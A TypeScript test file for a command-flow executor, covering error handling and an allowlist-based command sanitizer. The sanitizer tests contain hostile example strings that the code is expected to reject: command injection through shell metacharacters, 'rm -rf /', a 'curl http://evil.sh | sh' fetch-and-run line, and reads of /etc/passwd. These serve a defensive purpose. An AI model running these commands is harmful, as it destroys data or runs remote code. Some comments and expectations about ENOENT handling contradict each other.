import { describe, test, expect } from 'bun:test'
import { executeFlow, executeCommand, shouldContinueOnError, sanitizeCommand, type FlowDefinition } from '../executor.js'

/**
 * Regression tests for flow executor (issue #774).
 *
 * shouldContinueOnError: only ETIMEDOUT is transient; EACCES/ENOENT abort (#850)
 * are RECOVERABLE and the flow should CONTINUE (true); anything else is
 * fatal and should ABORT (false). The old code inverted this.
 */

describe('shouldContinueOnError (issue #774)', () => {
  test('ETIMEDOUT is transient -> continue (true)', async () => {
    expect(await shouldContinueOnError(new Error('ETIMEDOUT: operation timed out'), {} as never)).toBe(true)
  })

  test('EACCES/ENOENT are permanent -> abort (false)', async () => {
    // issue #850: permission-denied and missing-file errors do not resolve on
    // retry; retrying the same operation will always fail, so abort.
    expect(await shouldContinueOnError(new Error('EACCES: permission denied'), {} as never)).toBe(false)
    expect(await shouldContinueOnError(new Error('ENOENT: no such file'), {} as never)).toBe(false)
  })

  test('other errors are fatal -> abort (false)', async () => {
    expect(await shouldContinueOnError(new Error('SyntaxError: bad code'), {} as never)).toBe(false)
    expect(await shouldContinueOnError(new Error('EINVAL'), {} as never)).toBe(false)
  })
})

describe('executeFlow failure handling (issue #774)', () => {
  test('flow continues after a recoverable transient error', async () => {
    const flow: FlowDefinition = {
      name: 't',
      description: 'test',
      steps: [
        { id: 'a', description: 'a', command: 'mkdir /x' },
        { id: 'b', description: 'b', command: 'touch /y' },
      ],
    }
    const state = await executeFlow(
      flow,
      { bridge: { runCommand: async () => {}, editFile: async () => {} } },
      async (step) => {
        if (step.id === 'a') throw new Error('ETIMEDOUT: operation timed out')
      },
      undefined,
      undefined,
    )
    expect(state.completedSteps).toContain('b')
    expect(state.failedSteps).toEqual(['a'])
  })

  test('flow aborts after a fatal (non-transient) error', async () => {
    const flow: FlowDefinition = {
      name: 't',
      description: 'test',
      steps: [
        { id: 'a', description: 'a', command: 'x' },
        { id: 'b', description: 'b', command: 'y' },
      ],
    }
    const state = await executeFlow(
      flow,
      { bridge: { runCommand: async () => {}, editFile: async () => {} } },
      async (step) => {
        if (step.id === 'a') throw new Error('SyntaxError: bad')
      },
      undefined,
      undefined,
    )
    expect(state.completedSteps).not.toContain('b')
    expect(state.failedSteps).toEqual(['a'])
  })
})

describe('onStepFail callback error handling (issue #823)', () => {
  test('onStepFail throwing does not reject executeFlow and onComplete still fires', async () => {
    const flow: FlowDefinition = {
      name: 't',
      description: 'test',
      steps: [
        { id: 'a', description: 'a', command: 'mkdir /x' },
        { id: 'b', description: 'b', command: 'touch /y' },
      ],
    }
    let onCompleteCalled = false
    const state = await executeFlow(
      flow,
      { bridge: { runCommand: async () => {}, editFile: async () => {} } },
      async (step) => {
        if (step.id === 'a') throw new Error('ENOENT: no such file')
      },
      undefined,
      async () => {
        throw new Error('callback boom')
      },
      async () => {
        onCompleteCalled = true
      },
    )
    expect(state.failedSteps).toContain('a')
    expect(state.completedSteps).toContain('b')
    expect(onCompleteCalled).toBe(true)
  })
})

describe('missing bridge configuration (issue #808)', () => {
  test('shouldContinueOnError returns true for missing bridge errors', async () => {
    expect(await shouldContinueOnError(new Error('No bridge.runCommand available to execute: mkdir'), {} as never)).toBe(true)
    expect(await shouldContinueOnError(new Error('No bridge.editFile available to edit: foo'), {} as never)).toBe(true)
  })

  test('flow continues gracefully when bridge is missing (no context)', async () => {
    const flow: FlowDefinition = {
      name: 't',
      description: 'test',
      steps: [
        { id: 'a', description: 'a', command: 'mkdir /x' },
        { id: 'b', description: 'b', command: 'touch /y' },
      ],
    }
    // No bridge context provided - missing bridge is a recoverable error
    const state = await executeFlow(flow, {})
    expect(state.failedSteps).toContain('a')
    expect(state.failedSteps).toContain('b')
    expect(state.failedSteps.length).toBe(2)
  })

  test('flow continues gracefully when bridge has no runCommand', async () => {
    const flow: FlowDefinition = {
      name: 't',
      description: 'test',
      steps: [
        { id: 'a', description: 'a', command: 'mkdir /x' },
        { id: 'b', description: 'b', command: 'touch /y' },
      ],
    }
    // Bridge object exists but has no runCommand method
    const state = await executeFlow(flow, { bridge: { editFile: async () => {} } })
    expect(state.failedSteps).toContain('a')
    expect(state.failedSteps).toContain('b')
    expect(state.failedSteps.length).toBe(2)
  })
})

describe('executeCommand sanitization (issue #841)', () => {
  test('sanitizeCommand parses a simple command into argv', () => {
    const parsed = sanitizeCommand('npm install express jsonwebtoken bcrypt')
    expect(parsed).toEqual(['npm', 'install', 'express', 'jsonwebtoken', 'bcrypt'])
  })

  test('sanitizeCommand rejects shell metacharacters that enable injection', () => {
    expect(() => sanitizeCommand('npm install; rm -rf /')).toThrow()
    expect(() => sanitizeCommand('npm install && rm -rf /')).toThrow()
    expect(() => sanitizeCommand('npm install `rm -rf /`')).toThrow()
    expect(() => sanitizeCommand('npm install $(rm -rf /)')).toThrow()
    expect(() => sanitizeCommand('npm install | rm -rf /')).toThrow()
    expect(() => sanitizeCommand('npm install > /etc/passwd')).toThrow()
    expect(() => sanitizeCommand('npm install && curl http://evil.sh | sh')).toThrow()
  })

  test('sanitizeCommand rejects commands not on the allowlist', () => {
    expect(() => sanitizeCommand('rm -rf /')).toThrow()
    expect(() => sanitizeCommand('curl http://evil.sh | sh')).toThrow()
    expect(() => sanitizeCommand('cat /etc/passwd')).toThrow()
  })

  test('sanitizeCommand allows allowlisted commands (npm, mkdir, touch)', () => {
    expect(sanitizeCommand('npm install express')).toEqual(['npm', 'install', 'express'])
    expect(sanitizeCommand('mkdir -p src/foo')).toEqual(['mkdir', '-p', 'src/foo'])
    expect(sanitizeCommand('touch file.txt')).toEqual(['touch', 'file.txt'])
  })
})

describe('onComplete callback error handling (issue #837)', () => {
  test('onComplete throwing does not reject executeFlow', async () => {
    const flow: FlowDefinition = {
      name: 't',
      description: 'test',
      steps: [
        { id: 'a', description: 'a', command: 'mkdir /x' },
        { id: 'b', description: 'b', command: 'touch /y' },
      ],
    }
    const state = await executeFlow(
      flow,
      { bridge: { runCommand: async () => {}, editFile: async () => {} } },
      undefined,
      undefined,
      undefined,
      async () => {
        throw new Error('onComplete boom')
      },
    )
    expect(state.completedSteps).toEqual(['a', 'b'])
    expect(state.failedSteps).toEqual([])
  })
})

describe('executeCommand sanitization (issue #841)', () => {
  test('executeCommand passes parsed argv array to bridge.runCommand', async () => {
    const received: any[] = []
    const bridge = {
      runCommand: async (cmd: any) => {
        received.push(cmd)
      },
      editFile: async () => {},
    }
    await executeCommand('npm install express jsonwebtoken bcrypt', { bridge })
    expect(received).toHaveLength(1)
    // bridge should receive a structured argv array, not a raw shell string
    expect(Array.isArray(received[0])).toBe(true)
    expect(received[0]).toEqual(['npm', 'install', 'express', 'jsonwebtoken', 'bcrypt'])
  })

  test('executeCommand throws on injection attempt and never reaches the bridge', async () => {
    let called = false
    const bridge = {
      runCommand: async () => {
        called = true
      },
      editFile: async () => {},
    }
    await expect(
      executeCommand('npm install express; rm -rf /', { bridge }),
    ).rejects.toThrow()
    expect(called).toBe(false)
  })
})
